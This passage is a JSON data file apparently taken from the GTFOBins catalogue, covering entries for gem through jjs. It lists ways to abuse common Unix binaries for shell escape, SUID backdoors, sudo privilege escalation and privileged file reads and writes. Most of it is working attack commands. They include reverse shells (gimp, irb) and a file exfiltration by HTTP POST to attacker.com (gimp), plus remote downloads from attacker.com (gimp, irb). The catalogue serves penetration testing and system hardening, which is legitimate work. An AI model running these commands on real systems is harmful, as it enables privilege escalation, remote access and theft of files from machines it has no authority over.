        "man": "It can be used to break out from restricted environments by spawning an interactive system shell.\n\n\nThis requires the name of an installed gem to be provided (rdoc is usually installed).\ngem open -e \"/bin/sh -c /bin/sh\" rdoc\n\n\nThis invokes the default editor, which is likely to be vi, other functions may apply. This requires the name of an installed gem to be provided (rdoc is usually installed).\ngem open rdoc\n:!/bin/sh\n\n\nThis executes the specified file as ruby code.\nTF=$(mktemp -d)\necho 'system(\"/bin/sh\")' > $TF/x\ngem build $TF/x\n\n\nThis executes the specified file as ruby code.\nTF=$(mktemp -d)\necho 'system(\"/bin/sh\")' > $TF/x\ngem install --file $TF/x\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nThis requires the name of an installed gem to be provided (rdoc is usually installed).\nsudo gem open -e \"/bin/sh -c /bin/sh\" rdoc"
      }
    ]
  },
  {
    "id": 109,
    "bin": "genie",
    "url": "/gtfobins/genie/",
    "funcs": [
      {
        "func": "Shell",
        "man": "It can be used to break out from restricted environments by spawning an interactive system shell.\n\n\ngenie -c '/bin/sh'\n\n"
      },
      {
        "func": "SUID",
        "man": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nsudo install -m =xs $(which genie) .\n\n./genie -c '/bin/sh'\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nsudo genie -c '/bin/sh'"
      }
    ]
  },
  {
    "id": 110,
    "bin": "genisoimage",
    "url": "/gtfobins/genisoimage/",
    "funcs": [
      {
        "func": "File read",
        "man": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.\n\n\nLFILE=file_to_read\ngenisoimage -q -o - \"$LFILE\"\n\n"
      },
      {
        "func": "SUID",
        "man": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nThe file is parsed, and some of its content is disclosed by the error messages, thus this might not be suitable to read arbitrary data.\nsudo install -m =xs $(which genisoimage) .\n\nLFILE=file_to_read\n./genisoimage -sort \"$LFILE\"\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nLFILE=file_to_read\nsudo genisoimage -q -o - \"$LFILE\""
      }
    ]
  },
  {
    "id": 111,
    "bin": "ghc",
    "url": "/gtfobins/ghc/",
    "funcs": [
      {
        "func": "Shell",
        "man": "It can be used to break out from restricted environments by spawning an interactive system shell.\n\n\nghc -e 'System.Process.callCommand \"/bin/sh\"'\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nsudo ghc -e 'System.Process.callCommand \"/bin/sh\"'"
      }
    ]
  },
  {
    "id": 112,
    "bin": "ghci",
    "url": "/gtfobins/ghci/",
    "funcs": [
      {
        "func": "Shell",
        "man": "It can be used to break out from restricted environments by spawning an interactive system shell.\n\n\nghci\nSystem.Process.callCommand \"/bin/sh\"\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nsudo ghci\nSystem.Process.callCommand \"/bin/sh\""
      }
    ]
  },
  {
    "id": 113,
    "bin": "gimp",
    "url": "/gtfobins/gimp/",
    "funcs": [
      {
        "func": "Shell",
        "man": "It can be used to break out from restricted environments by spawning an interactive system shell.\n\n\ngimp -idf --batch-interpreter=python-fu-eval -b 'import os; os.system(\"sh\")'\n\n"
      },
      {
        "func": "Reverse shell",
        "man": "It can send back a reverse shell to a listening attacker to open a remote network access.\n\n\nRun socat file:`tty`,raw,echo=0 tcp-listen:12345 on the attacker box to receive the shell.\nexport RHOST=attacker.com\nexport RPORT=12345\ngimp -idf --batch-interpreter=python-fu-eval -b 'import sys,socket,os,pty;s=socket.socket()\ns.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))))\n[os.dup2(s.fileno(),fd) for fd in (0,1,2)]\npty.spawn(\"/bin/sh\")'\n\n"
      },
      {
        "func": "File upload",
        "man": "It can exfiltrate files on the network.\n\n\nSend local file via \u201cd\u201d parameter of a HTTP POST request. Run an HTTP service on the attacker box to collect the file.\nexport URL=http://attacker.com/\nexport LFILE=file_to_send\ngimp -idf --batch-interpreter=python-fu-eval -b 'import sys; from os import environ as e\nif sys.version_info.major == 3: import urllib.request as r, urllib.parse as u\nelse: import urllib as u, urllib2 as r\nr.urlopen(e[\"URL\"], bytes(u.urlencode({\"d\":open(e[\"LFILE\"]).read()}).encode()))'\n\n\nServe files in the local folder running an HTTP server.\nexport LPORT=8888\ngimp -idf --batch-interpreter=python-fu-eval -b 'import sys; from os import environ as e\nif sys.version_info.major == 3: import http.server as s, socketserver as ss\nelse: import SimpleHTTPServer as s, SocketServer as ss\nss.TCPServer((\"\", int(e[\"LPORT\"])), s.SimpleHTTPRequestHandler).serve_forever()'\n\n"
      },
      {
        "func": "File download",
        "man": "It can download remote files.\n\n\nFetch a remote file via HTTP GET request.\nexport URL=http://attacker.com/file_to_get\nexport LFILE=file_to_save\ngimp -idf --batch-interpreter=python-fu-eval -b 'import sys; from os import environ as e\nif sys.version_info.major == 3: import urllib.request as r\nelse: import urllib as r\nr.urlretrieve(e[\"URL\"], e[\"LFILE\"])'\n\n"
      },
      {
        "func": "File write",
        "man": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.\n\n\ngimp -idf --batch-interpreter=python-fu-eval -b 'open(\"file_to_write\", \"wb\").write(\"DATA\")'\n\n"
      },
      {
        "func": "File read",
        "man": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.\n\n\ngimp -idf --batch-interpreter=python-fu-eval -b 'print(open(\"file_to_read\").read())'\n\n"
      },
      {
        "func": "Library load",
        "man": "It loads shared libraries that may be used to run code in the binary execution context.\n\n\ngimp -idf --batch-interpreter=python-fu-eval -b 'from ctypes import cdll; cdll.LoadLibrary(\"lib.so\")'\n\n"
      },
      {
        "func": "SUID",
        "man": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nsudo install -m =xs $(which gimp) .\n\n./gimp -idf --batch-interpreter=python-fu-eval -b 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nsudo gimp -idf --batch-interpreter=python-fu-eval -b 'import os; os.system(\"sh\")'"
      }
    ]
  },
  {
    "id": 114,
    "bin": "ginsh",
    "url": "/gtfobins/ginsh/",
    "funcs": [
      {
        "func": "Shell",
        "man": "It can be used to break out from restricted environments by spawning an interactive system shell.\n\n\nginsh\n!/bin/sh\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nsudo ginsh\n!/bin/sh\n\n"
      },
      {
        "func": "Limited SUID",
        "man": "If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via system()-like invocations) it only works on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nsudo install -m =xs $(which ginsh) .\n\n./ginsh\n!/bin/sh"
      }
    ]
  },
  {
    "id": 115,
    "bin": "git",
    "url": "/gtfobins/git/",
    "funcs": [
      {
        "func": "Shell",
        "man": "It can be used to break out from restricted environments by spawning an interactive system shell.\n\n\nPAGER='sh -c \"exec sh 0<&1\"' git -p help\n\n\nThis invokes the default pager, which is likely to be less, other functions may apply.\ngit help config\n!/bin/sh\n\n\nThe help system can also be reached from any git command, e.g., git branch. This invokes the default pager, which is likely to be less, other functions may apply.\ngit branch --help config\n!/bin/sh\n\n\nGit hooks are merely shell scripts and in the following example the hook associated to the pre-commit action is used. Any other hook will work, just make sure to be able perform the proper action to trigger it. An existing repository can also be used and moving into the directory works too, i.e., instead of using the -C option.\nTF=$(mktemp -d)\ngit init \"$TF\"\necho 'exec /bin/sh 0<&2 1>&2' >\"$TF/.git/hooks/pre-commit.sample\"\nmv \"$TF/.git/hooks/pre-commit.sample\" \"$TF/.git/hooks/pre-commit\"\ngit -C \"$TF\" commit --allow-empty -m x\n\n\nTF=$(mktemp -d)\nln -s /bin/sh \"$TF/git-x\"\ngit \"--exec-path=$TF\" x\n\n"
      },
      {
        "func": "File read",
        "man": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.\n\n\nThe read file content is displayed in diff style output format.\nLFILE=file_to_read\ngit diff /dev/null $LFILE\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nsudo PAGER='sh -c \"exec sh 0<&1\"' git -p help\n\n\nThis invokes the default pager, which is likely to be less, other functions may apply.\nsudo git -p help config\n!/bin/sh\n\n\nThe help system can also be reached from any git command, e.g., git branch. This invokes the default pager, which is likely to be less, other functions may apply.\nsudo git branch --help config\n!/bin/sh\n\n\nGit hooks are merely shell scripts and in the following example the hook associated to the pre-commit action is used. Any other hook will work, just make sure to be able perform the proper action to trigger it. An existing repository can also be used and moving into the directory works too, i.e., instead of using the -C option.\nTF=$(mktemp -d)\ngit init \"$TF\"\necho 'exec /bin/sh 0<&2 1>&2' >\"$TF/.git/hooks/pre-commit.sample\"\nmv \"$TF/.git/hooks/pre-commit.sample\" \"$TF/.git/hooks/pre-commit\"\nsudo git -C \"$TF\" commit --allow-empty -m x\n\n\nTF=$(mktemp -d)\nln -s /bin/sh \"$TF/git-x\"\nsudo git \"--exec-path=$TF\" x\n\n"
      },
      {
        "func": "Limited SUID",
        "man": "If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via system()-like invocations) it only works on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nsudo install -m =xs $(which git) .\n\nPAGER='sh -c \"exec sh 0<&1\"' ./git -p help"
      }
    ]
  },
  {
    "id": 116,
    "bin": "grc",
    "url": "/gtfobins/grc/",
    "funcs": [
      {
        "func": "Shell",
        "man": "It can be used to break out from restricted environments by spawning an interactive system shell.\n\n\ngrc --pty /bin/sh\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nsudo grc --pty /bin/sh"
      }
    ]
  },
  {
    "id": 117,
    "bin": "grep",
    "url": "/gtfobins/grep/",
    "funcs": [
      {
        "func": "File read",
        "man": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.\n\n\nLFILE=file_to_read\ngrep '' $LFILE\n\n"
      },
      {
        "func": "SUID",
        "man": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nsudo install -m =xs $(which grep) .\n\nLFILE=file_to_read\n./grep '' $LFILE\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nLFILE=file_to_read\nsudo grep '' $LFILE"
      }
    ]
  },
  {
    "id": 118,
    "bin": "gtester",
    "url": "/gtfobins/gtester/",
    "funcs": [
      {
        "func": "Shell",
        "man": "It can be used to break out from restricted environments by spawning an interactive system shell.\n\n\nTF=$(mktemp)\necho '#!/bin/sh' > $TF\necho 'exec /bin/sh -p 0<&1' >> $TF\nchmod +x $TF\ngtester -q $TF\n\n"
      },
      {
        "func": "File write",
        "man": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.\n\n\nData to be written appears in an XML attribute in the output file (<testbinary path=\"DATA\">).\nLFILE=file_to_write\ngtester \"DATA\" -o $LFILE\n\n"
      },
      {
        "func": "SUID",
        "man": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nsudo install -m =xs $(which gtester) .\n\nTF=$(mktemp)\necho '#!/bin/sh -p' > $TF\necho 'exec /bin/sh -p 0<&1' >> $TF\nchmod +x $TF\nsudo gtester -q $TF\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nTF=$(mktemp)\necho '#!/bin/sh' > $TF\necho 'exec /bin/sh 0<&1' >> $TF\nchmod +x $TF\nsudo gtester -q $TF"
      }
    ]
  },
  {
    "id": 119,
    "bin": "gzip",
    "url": "/gtfobins/gzip/",
    "funcs": [
      {
        "func": "File read",
        "man": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.\n\n\nLFILE=file_to_read\ngzip -f $LFILE -t\n\n\nLFILE=file_to_read\ngzip -c $LFILE | gzip -d\n\n"
      },
      {
        "func": "SUID",
        "man": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nsudo install -m =xs $(which gzip) .\n\nLFILE=file_to_read\n./gzip -f $LFILE -t\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nLFILE=file_to_read\nsudo gzip -f $LFILE -t"
      }
    ]
  },
  {
    "id": 120,
    "bin": "hd",
    "url": "/gtfobins/hd/",
    "funcs": [
      {
        "func": "File read",
        "man": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.\n\n\nLFILE=file_to_read\nhd \"$LFILE\"\n\n"
      },
      {
        "func": "SUID",
        "man": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nsudo install -m =xs $(which hd) .\n\nLFILE=file_to_read\n./hd \"$LFILE\"\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nLFILE=file_to_read\nsudo hd \"$LFILE\""
      }
    ]
  },
  {
    "id": 121,
    "bin": "head",
    "url": "/gtfobins/head/",
    "funcs": [
      {
        "func": "File read",
        "man": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.\n\n\nLFILE=file_to_read\nhead -c1G \"$LFILE\"\n\n"
      },
      {
        "func": "SUID",
        "man": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nsudo install -m =xs $(which head) .\n\nLFILE=file_to_read\n./head -c1G \"$LFILE\"\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nLFILE=file_to_read\nsudo head -c1G \"$LFILE\""
      }
    ]
  },
  {
    "id": 122,
    "bin": "hexdump",
    "url": "/gtfobins/hexdump/",
    "funcs": [
      {
        "func": "File read",
        "man": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.\n\n\nLFILE=file_to_read\nhexdump -C \"$LFILE\"\n\n"
      },
      {
        "func": "SUID",
        "man": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nsudo install -m =xs $(which hexdump) .\n\nLFILE=file_to_read\n./hexdump -C \"$LFILE\"\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nLFILE=file_to_read\nsudo hexdump -C \"$LFILE\""
      }
    ]
  },
  {
    "id": 123,
    "bin": "highlight",
    "url": "/gtfobins/highlight/",
    "funcs": [
      {
        "func": "File read",
        "man": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.\n\n\nLFILE=file_to_read\nhighlight --no-doc --failsafe \"$LFILE\"\n\n"
      },
      {
        "func": "SUID",
        "man": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nsudo install -m =xs $(which highlight) .\n\nLFILE=file_to_read\n./highlight --no-doc --failsafe \"$LFILE\"\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nLFILE=file_to_read\nsudo highlight --no-doc --failsafe \"$LFILE\""
      }
    ]
  },
  {
    "id": 124,
    "bin": "hping3",
    "url": "/gtfobins/hping3/",
    "funcs": [
      {
        "func": "Shell",
        "man": "It can be used to break out from restricted environments by spawning an interactive system shell.\n\n\nhping3\n/bin/sh\n\n"
      },
      {
        "func": "SUID",
        "man": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nsudo install -m =xs $(which hping3) .\n\n./hping3\n/bin/sh -p\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nsudo hping3\n/bin/sh"
      }
    ]
  },
  {
    "id": 125,
    "bin": "iconv",
    "url": "/gtfobins/iconv/",
    "funcs": [
      {
        "func": "File write",
        "man": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.\n\n\nLFILE=file_to_write\necho \"DATA\" | iconv -f 8859_1 -t 8859_1 -o \"$LFILE\"\n\n"
      },
      {
        "func": "File read",
        "man": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.\n\n\nLFILE=file_to_read\niconv -f 8859_1 -t 8859_1 \"$LFILE\"\n\n"
      },
      {
        "func": "SUID",
        "man": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nsudo install -m =xs $(which iconv) .\n\nLFILE=file_to_read\n./iconv -f 8859_1 -t 8859_1 \"$LFILE\"\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nLFILE=file_to_read\n./iconv -f 8859_1 -t 8859_1 \"$LFILE\""
      }
    ]
  },
  {
    "id": 126,
    "bin": "iftop",
    "url": "/gtfobins/iftop/",
    "funcs": [
      {
        "func": "Shell",
        "man": "It can be used to break out from restricted environments by spawning an interactive system shell.\n\n\niftop\n!/bin/sh\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nsudo iftop\n!/bin/sh\n\n"
      },
      {
        "func": "Limited SUID",
        "man": "If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via system()-like invocations) it only works on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nsudo install -m =xs $(which iftop) .\n\n./iftop\n!/bin/sh"
      }
    ]
  },
  {
    "id": 127,
    "bin": "install",
    "url": "/gtfobins/install/",
    "funcs": [
      {
        "func": "SUID",
        "man": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nsudo install -m =xs $(which install) .\n\nLFILE=file_to_change\nTF=$(mktemp)\n./install -m 6777 $LFILE $TF\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nLFILE=file_to_change\nTF=$(mktemp)\nsudo install -m 6777 $LFILE $TF"
      }
    ]
  },
  {
    "id": 128,
    "bin": "ionice",
    "url": "/gtfobins/ionice/",
    "funcs": [
      {
        "func": "Shell",
        "man": "It can be used to break out from restricted environments by spawning an interactive system shell.\n\n\nionice /bin/sh\n\n"
      },
      {
        "func": "SUID",
        "man": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nsudo install -m =xs $(which ionice) .\n\n./ionice /bin/sh -p\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nsudo ionice /bin/sh"
      }
    ]
  },
  {
    "id": 129,
    "bin": "ip",
    "url": "/gtfobins/ip/",
    "funcs": [
      {
        "func": "File read",
        "man": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.\n\n\nLFILE=file_to_read\nip -force -batch \"$LFILE\"\n\n"
      },
      {
        "func": "SUID",
        "man": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nsudo install -m =xs $(which ip) .\n\nLFILE=file_to_read\n./ip -force -batch \"$LFILE\"\n\n\nThis only works for Linux with CONFIG_NET_NS=y.\nsudo install -m =xs $(which ip) .\n\n./ip netns add foo\n./ip netns exec foo /bin/sh -p\n./ip netns delete foo\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nLFILE=file_to_read\nsudo ip -force -batch \"$LFILE\"\n\n\nThis only works for Linux with CONFIG_NET_NS=y.\nsudo ip netns add foo\nsudo ip netns exec foo /bin/sh\nsudo ip netns delete foo"
      }
    ]
  },
  {
    "id": 130,
    "bin": "irb",
    "url": "/gtfobins/irb/",
    "funcs": [
      {
        "func": "Shell",
        "man": "It can be used to break out from restricted environments by spawning an interactive system shell.\n\n\nirb\nexec '/bin/bash'\n\n"
      },
      {
        "func": "Reverse shell",
        "man": "It can send back a reverse shell to a listening attacker to open a remote network access.\n\n\nRun nc -l -p 12345 on the attacker box to receive the shell.\nexport RHOST='127.0.0.1'\nexport RPORT=9000\nirb\nrequire 'socket'; exit if fork;c=TCPSocket.new(ENV[\"RHOST\"],ENV[\"RPORT\"]);while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read} end\n\n"
      },
      {
        "func": "File upload",
        "man": "It can exfiltrate files on the network.\n\n\nServe files in the local folder running an HTTP server on port 8888.\nirb\nrequire 'webrick'; WEBrick::HTTPServer.new(:Port => 8888, :DocumentRoot => Dir.pwd).start;\n\n"
      },
      {
        "func": "File download",
        "man": "It can download remote files.\n\n\nFetch a remote file via HTTP GET request.\nexport URL=http://attacker.com/file_to_get\nexport LFILE=file_to_save\nirb\nrequire 'open-uri'; download = open(ENV['URL']); IO.copy_stream(download, ENV['LFILE'])\n\n"
      },
      {
        "func": "File write",
        "man": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.\n\n\nirb\nFile.open(\"file_to_write\", \"w+\") { |f| f.write(\"DATA\") }\n\n"
      },
      {
        "func": "File read",
        "man": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.\n\n\nirb\nputs File.read(\"file_to_read\")\n\n"
      },
      {
        "func": "Library load",
        "man": "It loads shared libraries that may be used to run code in the binary execution context.\n\n\nirb\nrequire \"fiddle\"; Fiddle.dlopen(\"lib.so\")\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nsudo irb\nexec '/bin/bash'"
      }
    ]
  },
  {
    "id": 131,
    "bin": "ispell",
    "url": "/gtfobins/ispell/",
    "funcs": [
      {
        "func": "Shell",
        "man": "It can be used to break out from restricted environments by spawning an interactive system shell.\n\n\nispell /etc/passwd\n!/bin/sh\n\n"
      },
      {
        "func": "SUID",
        "man": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nsudo install -m =xs $(which ispell) .\n\n./ispell /etc/passwd\n!/bin/sh -p\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nsudo ispell /etc/passwd\n!/bin/sh"
      }
    ]
  },
  {
    "id": 132,
    "bin": "jjs",
    "url": "/gtfobins/jjs/",
    "funcs": [
      {
        "func": "Shell",
        "man": "It can be used to break out from restricted environments by spawning an interactive system shell.\n\n\necho \"Java.type('java.lang.Runtime').getRuntime().exec('/bin/sh -c \\$@|sh _ echo sh <$(tty) >$(tty) 2>$(tty)').waitFor()\" | jjs\n\n"
      },
      {
        "func": "Reverse shell",
